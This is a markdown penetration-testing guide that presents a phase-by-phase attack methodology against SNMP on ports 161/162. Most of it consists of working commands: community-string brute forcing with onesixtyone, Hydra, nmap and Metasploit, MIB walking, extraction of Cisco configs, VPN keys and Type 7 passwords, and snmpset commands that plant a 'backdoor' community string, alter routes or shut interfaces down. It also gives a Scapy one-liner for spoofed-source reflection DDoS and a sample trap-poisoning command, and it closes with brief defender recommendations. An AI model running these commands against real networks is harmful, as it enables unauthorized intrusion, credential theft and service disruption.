# Port 161/162 - SNMP (Simple Network Management Protocol) - Complete Attack Guide

## Overview

**Protocol**: SNMP (Simple Network Management Protocol)
**Ports**: 161 (SNMP), 162 (SNMP Trap)
**Transport**: UDP (primary), TCP (some versions)
**Versions**: SNMPv1, SNMPv2c (community-based), SNMPv3 (authentication)
**Authentication**: Community strings (v1/v2c), User-based (v3)

## Attack Objectives

- **Community String Brute Force**: Discover valid community strings
- **Information Gathering**: Extract device configuration
- **MIB Walking**: Enumerate all OIDs
- **Configuration Extraction**: Dump router/switch configs
- **Credential Harvesting**: Extract passwords and hashes
- **Device Modification**: Change configuration (write access)
- **DoS Attacks**: Crash SNMP service

## Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect SNMP Service**
```bash
# Quick UDP scan
nmap -sU -p 161 192.168.1.100

# Service version
nmap -sU -p 161,162 -sV 192.168.1.100

# SNMP scripts
nmap -sU -p 161 --script snmp-* 192.168.1.100

# Network-wide discovery
nmap -sU -p 161 192.168.1.0/24 --open

# Fast scan with onesixtyone
onesixtyone 192.168.1.0/24
```

**1.2 SNMP Version Detection**
```bash
# Using Nmap
nmap -sU -p 161 --script snmp-info 192.168.1.100

# Using snmpwalk
snmpwalk -v1 -c public 192.168.1.100 system
snmpwalk -v2c -c public 192.168.1.100 system
snmpwalk -v3 -l noAuthNoPriv -u user 192.168.1.100 system

# Check for SNMPv3
nmap -sU -p 161 --script snmp-v3-info 192.168.1.100
```

**1.3 Initial Information Gathering**
```bash
# Get system information
snmpget -v2c -c public 192.168.1.100 sysDescr.0
snmpget -v2c -c public 192.168.1.100 sysName.0
snmpget -v2c -c public 192.168.1.100 sysLocation.0
snmpget -v2c -c public 192.168.1.100 sysContact.0

# System uptime
snmpget -v2c -c public 192.168.1.100 sysUpTime.0
```

### Phase 2: Community String Attacks

**2.1 Default Community Strings**
```bash
# Common defaults
public      # Read-only (most common)
private     # Read-write
community
snmp
secret
cisco
manager
admin
default

# Test defaults
snmpwalk -v2c -c public 192.168.1.100
snmpwalk -v2c -c private 192.168.1.100
```

**2.2 Community String Brute Force**

**Using onesixtyone**:
```bash
# Fast brute force (best tool for SNMP)
onesixtyone -c community.txt 192.168.1.100

# Network-wide
onesixtyone -c community.txt 192.168.1.0/24

# Verbose output
onesixtyone -c community.txt -w 100 192.168.1.0/24

# With common list
echo -e "public\nprivate\ncommunity" > common.txt
onesixtyone -c common.txt 192.168.1.100
```

**Using Nmap**:
```bash
# SNMP brute force
nmap -sU -p 161 --script snmp-brute 192.168.1.100

# With custom wordlist
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=community.txt 192.168.1.100
```

**Using Metasploit**:
```bash
use auxiliary/scanner/snmp/snmp_login
set RHOSTS 192.168.1.100
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
run
```

**Using Hydra**:
```bash
# SNMP v1/v2c brute force
hydra -P community.txt snmp://192.168.1.100

# Specify version
hydra -P community.txt -m v2c snmp://192.168.1.100
```

**2.3 SNMPv3 Authentication**
```bash
# SNMPv3 uses username/password instead
# Brute force username
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.protocol=3 192.168.1.100

# With known username
snmpwalk -v3 -l authPriv -u admin -a MD5 -A password123 -x DES -X password123 192.168.1.100
```

### Phase 3: Information Enumeration

**3.1 MIB Walking**
```bash
# Walk entire MIB tree
snmpwalk -v2c -c public 192.168.1.100

# Walk specific OID
snmpwalk -v2c -c public 192.168.1.100 .1.3.6.1.2.1.1

# System information
snmpwalk -v2c -c public 192.168.1.100 system

# Network interfaces
snmpwalk -v2c -c public 192.168.1.100 interfaces

# IP forwarding table (routing)
snmpwalk -v2c -c public 192.168.1.100 ipForwarding

# TCP connections
snmpwalk -v2c -c public 192.168.1.100 tcpConnState

# UDP connections
snmpwalk -v2c -c public 192.168.1.100 udpLocalAddress
```

**3.2 Network Information**
```bash
# IP addresses
snmpwalk -v2c -c public 192.168.1.100 ipAdEntAddr

# Network interfaces
snmpwalk -v2c -c public 192.168.1.100 ifDescr
snmpwalk -v2c -c public 192.168.1.100 ifAdminStatus

# ARP table
snmpwalk -v2c -c public 192.168.1.100 atPhysAddress

# Routing table
snmpwalk -v2c -c public 192.168.1.100 ipRouteNextHop

# DNS servers
snmpwalk -v2c -c public 192.168.1.100 .1.3.6.1.4.1.77.1.4.3
```

**3.3 Device Information**
```bash
# Device type and OS
snmpget -v2c -c public 192.168.1.100 sysDescr.0

# Device name
snmpget -v2c -c public 192.168.1.100 sysName.0

# Device location
snmpget -v2c -c public 192.168.1.100 sysLocation.0

# Contact information
snmpget -v2c -c public 192.168.1.100 sysContact.0

# Services running
snmpget -v2c -c public 192.168.1.100 sysServices.0
```

**3.4 Using snmp-check**
```bash
# Comprehensive enumeration
snmp-check -c public 192.168.1.100

# Verbose output
snmp-check -v -c public 192.168.1.100

# Write to file
snmp-check -c public 192.168.1.100 > snmp_enum.txt
```

**3.5 Using Nmap Scripts**
```bash
# Interface information
nmap -sU -p 161 --script snmp-interfaces 192.168.1.100

# Network information
nmap -sU -p 161 --script snmp-netstat 192.168.1.100

# Process information
nmap -sU -p 161 --script snmp-processes 192.168.1.100

# Windows user enumeration
nmap -sU -p 161 --script snmp-win32-users 192.168.1.100

# Windows services
nmap -sU -p 161 --script snmp-win32-services 192.168.1.100

# Software inventory
nmap -sU -p 161 --script snmp-win32-software 192.168.1.100
```

### Phase 4: Configuration Extraction

**4.1 Cisco Device Enumeration**
```bash
# Using Metasploit
use auxiliary/scanner/snmp/cisco_config_tftp
set RHOSTS 192.168.1.100
set COMMUNITY public
run

# Cisco IOS version
snmpwalk -v2c -c public 192.168.1.100 .1.3.6.1.4.1.9.9.25.1.1.1.2

# Running config (if accessible)
snmpwalk -v2c -c private 192.168.1.100 .1.3.6.1.4.1.9.9.96.1.1.1.1.4

# VLAN information
snmpwalk -v2c -c public 192.168.1.100 vtpVlanState

# Using cisco-snmp-enumeration
python cisco-snmp-enum.py -t 192.168.1.100 -c public
```

**4.2 Windows Enumeration**
```bash
# User accounts
snmpwalk -v2c -c public 192.168.1.100 .1.3.6.1.4.1.77.1.2.25

# Running processes
snmpwalk -v2c -c public 192.168.1.100 hrSWRunName

# Installed software
snmpwalk -v2c -c public 192.168.1.100 hrSWInstalledName

# Storage information
snmpwalk -v2c -c public 192.168.1.100 hrStorageDescr

# Using snmpwalk with Nmap
nmap -sU -p 161 --script snmp-win32-users,snmp-win32-services,snmp-win32-software 192.168.1.100
```

**4.3 Linux/Unix Enumeration**
```bash
# Running processes
snmpwalk -v2c -c public 192.168.1.100 hrSWRunName

# Users
snmpwalk -v2c -c public 192.168.1.100 .1.3.6.1.4.1.2021.9.1.2

# Disk usage
snmpwalk -v2c -c public 192.168.1.100 hrStorageUsed

# Load average
snmpwalk -v2c -c public 192.168.1.100 laLoad
```

### Phase 5: Credential Extraction

**5.1 Extract Hashes and Passwords**
```bash
# VPN passwords (Cisco)
snmpwalk -v2c -c private 192.168.1.100 .1.3.6.1.4.1.9.9.171.1.2.3.1.2

# SNMP community strings
snmpwalk -v2c -c private 192.168.1.100 .1.3.6.1.6.3.15.1.2.2.1.6

# User passwords (if readable)
# Windows NTLM hashes may be accessible

# Using Metasploit
use auxiliary/scanner/snmp/snmp_enumusers
set RHOSTS 192.168.1.100
set COMMUNITY public
run
```

**5.2 Cisco Type 7 Password Decryption**
```bash
# Extract Type 7 passwords from config
snmpwalk -v2c -c private 192.168.1.100 | grep "password 7"

# Decrypt Type 7 (weak encryption)
# Online: https://www.ifm.net.nz/cookbooks/passwordcracker.html
# Or use tool
cisco-decrypt.py <encrypted_password>
```

### Phase 6: Modification Attacks (Write Access)

**6.1 Test Write Access**
```bash
# Try to set sysContact (requires write community string)
snmpset -v2c -c private 192.168.1.100 sysContact.0 s "Attacker"

# Check if successful
snmpget -v2c -c public 192.168.1.100 sysContact.0
```

**6.2 Change Configuration**
```bash
# Modify SNMP community string
snmpset -v2c -c private 192.168.1.100 communityString backdoor

# Change IP address (dangerous)
snmpset -v2c -c private 192.168.1.100 ipAdEntAddr.X.X.X.X a Y.Y.Y.Y

# Shutdown interface
snmpset -v2c -c private 192.168.1.100 ifAdminStatus.1 i 2

# Enable interface
snmpset -v2c -c private 192.168.1.100 ifAdminStatus.1 i 1
```

**6.3 Router/Switch Manipulation**
```bash
# Change routing table
snmpset -v2c -c private 192.168.1.100 ipRouteNextHop.X.X.X.X a Y.Y.Y.Y

# VLAN hopping setup (if write access)
# Modify VLAN assignments

# Cisco specific
# Upload config via TFTP
use auxiliary/scanner/snmp/cisco_config_tftp
```

### Phase 7: Advanced Attacks

**7.1 SNMP Reflection/Amplification DDoS**
```bash
# SNMP can be abused for amplification attacks
# Send small query, get large response

# Using Scapy
from scapy.all import *
send(IP(src="victim_ip", dst="snmp_server")/UDP()/SNMP(community="public", PDU=SNMPbulk(reqid=1, max_repetitions=100)))

# Amplification factor: 6-10x
```

**7.2 SNMP Trap Poisoning**
```bash
# Send fake SNMP traps to management station
# Can cause alerts/actions

# Using snmptrap
snmptrap -v 2c -c public manager_ip "" .1.3.6.1.4.1 system "" 6 17 "" .1.3.6.1.4.1 s "Fake Alert"
```

## Bypass Techniques

### Bypassing Access Control

**Method 1: IPv6 (if IPv4 restricted)**
```bash
# Try SNMP over IPv6
snmpwalk -v2c -c public udp6:[fe80::1%eth0]:161 system
```

**Method 2: Source IP Spoofing**
```bash
# If ACL based on source IP
# Spoof allowed IP (requires raw socket access)
```

**Method 3: Alternate Ports**
```bash
# Some devices run SNMP on non-standard ports
nmap -sU -p 1-65535 192.168.1.100 | grep snmp
```

## Information Extraction Summary

**Critical OIDs**:
```bash
# System
.1.3.6.1.2.1.1.1.0  # sysDescr
.1.3.6.1.2.1.1.5.0  # sysName
.1.3.6.1.2.1.1.6.0  # sysLocation

# Network
.1.3.6.1.2.1.4.20.1.1  # IP addresses
.1.3.6.1.2.1.2.2.1.2   # Interface names
.1.3.6.1.2.1.4.21.1.1  # Routing table

# Windows
.1.3.6.1.4.1.77.1.2.25  # User accounts
.1.3.6.1.2.1.25.4.2.1.2 # Running processes

# Cisco
.1.3.6.1.4.1.9.9.96.1.1.1.1.4  # Running config
```

## Security Recommendations

**For Defenders**:
1. **Change Default Community Strings** - Use complex strings
2. **Use SNMPv3** - Provides authentication and encryption
3. **Access Control Lists** - Restrict SNMP access by IP
4. **Read-Only** - Only enable write if absolutely necessary
5. **Firewall** - Block UDP 161/162 from internet
6. **Monitor SNMP Access** - Log all queries
7. **Disable if Unused** - Turn off SNMP if not needed
8. **Use Complex Community Strings** - Long and random
9. **Encryption** - SNMPv3 with authPriv
10. **Regular Audits** - Check SNMP configuration

## Practical Attack Scenario

```bash
# Discovery
nmap -sU -p 161 192.168.1.0/24 --open
# Found: 192.168.1.1 (router)

# Test default community
snmpwalk -v2c -c public 192.168.1.1 system
# SUCCESS! public works

# Enumerate device
snmpget -v2c -c public 192.168.1.1 sysDescr.0
# Cisco IOS Router

# Try common write strings
snmpset -v2c -c private 192.168.1.1 sysContact.0 s "test"
# SUCCESS! private = write access

# Extract full configuration
snmp-check -v -c public 192.168.1.1 > router_config.txt

# Found in output:
# - All VLANs
# - Internal IP ranges
# - Connected devices
# - Routing tables
# - Running processes
# - SNMP users

# Extracted credentials:
# - VPN preshared keys
# - Type 7 passwords (decrypted)
# - SNMP community strings for other devices

# Network fully mapped!
```

## Tools Summary

**Best Tool for Each Task**:
- **Discovery**: Nmap (UDP scan)
- **Community Brute Force**: onesixtyone (fastest)
- **Enumeration**: snmp-check, snmpwalk
- **Cisco Enumeration**: Metasploit cisco modules
- **Windows Enumeration**: Nmap snmp-win32-* scripts
- **MIB Walking**: snmpwalk, snmpbulkwalk

## Related Attacks

- **Port 69 (TFTP)**: Upload router configs via SNMP+TFTP
- **Port 22/23**: SSH/Telnet credentials found in SNMP
- **Network Mapping**: SNMP reveals full network topology
- **Credential Harvesting**: Extract passwords for other services

---

**Last Updated**: 2026-06-16
